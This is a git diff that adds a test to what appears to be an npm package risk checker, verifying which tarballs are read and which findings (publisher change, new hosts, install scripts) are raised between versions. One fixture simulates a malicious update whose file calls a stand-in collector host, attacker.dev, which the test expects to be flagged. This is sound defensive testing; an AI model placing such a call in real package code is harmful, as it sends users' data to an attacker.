@@ -106,6 +106,27 @@ test('against the version before: what it adds and changes, its publisher and pr
     'npm counts none of its downloads: unpopular, saying so, first published half a day before the open version')
 })
 
+test('against the version before, its tarball read only where its files could change what is found', async t => {
+  const files = { 'package.json': '{}', 'index.js': 'module.exports = require("./lib")\n', 'lib/index.js': 'module.exports = 1\n' }
+  const before = version('gated', '1.0.0', files, { dependencies: {}, scripts: {} }, ago(60))
+  const after = version('gated', '1.0.1', { ...files, 'lib/index.js': 'module.exports = 2\n' }, { dependencies: {}, scripts: {}, _npmUser: { name: 'someone-new' } }, ago(40))
+  const hosted = version('gated', '1.0.2', { ...files, 'lib/index.js': 'get("https://collector.attacker.dev/x")\n' },
+    { dependencies: {}, scripts: {}, _npmUser: { name: 'someone-new' } }, ago(20))
+  const asked = npm(t, [{ name: 'gated', versions: [before, after, hosted] }])
+  const tarballs = () => asked.filter(url => url.endsWith('.tgz'))
+  assert.deepEqual(ids(await assessNpm('gated', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })), ['publisher'], 'its manifest told by npm\'s document')
+  assert.deepEqual(tarballs(), [after.doc.dist.tarball], 'nothing of its files a file finding flags: 1.0.0\'s files not read')
+  asked.length = 0
+  assert.deepEqual(ids(await assessNpm('gated', '1.0.2', { oldVersion: '1.0.1', now: NOW, downloads: false })), ['new-hosts'])
+  assert.deepEqual(tarballs(), [hosted.doc.dist.tarball, after.doc.dist.tarball], 'a host it names: 1.0.1\'s read, for whether it named it')
+  const gyp = { 'package.json': '{}', 'binding.gyp': '{}' }
+  const built = version('built', '1.0.0', gyp, { dependencies: {}, scripts: {} }, ago(60))
+  const rebuilt = version('built', '1.0.1', { ...gyp, 'addon.cc': '' }, { dependencies: {}, scripts: { install: 'node-gyp rebuild' } }, ago(40))
+  const read = npm(t, [{ name: 'built', versions: [built, rebuilt] }])
+  assert.deepEqual(ids(await assessNpm('built', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })), [], 'node-gyp ran for 1.0.0\'s binding.gyp all the same')
+  assert.deepEqual(read.filter(url => url.endsWith('.tgz')), [rebuilt.doc.dist.tarball, built.doc.dist.tarball], 'install scripts, and 1.0.0\'s naming none: its files read')
+})
+
 test('a package few download is flagged as unpopular, but where its popularity isn\'t asked, as own scopes take', async t => {
   const asked = npm(t, [{ name: 'own', versions: [version('own', '1.0.0', { 'package.json': '{}' }, { dependencies: {} }, ago(400))] }],
     { own: { start: '2026-08-01', end: '2026-10-11', downloads: [] } })
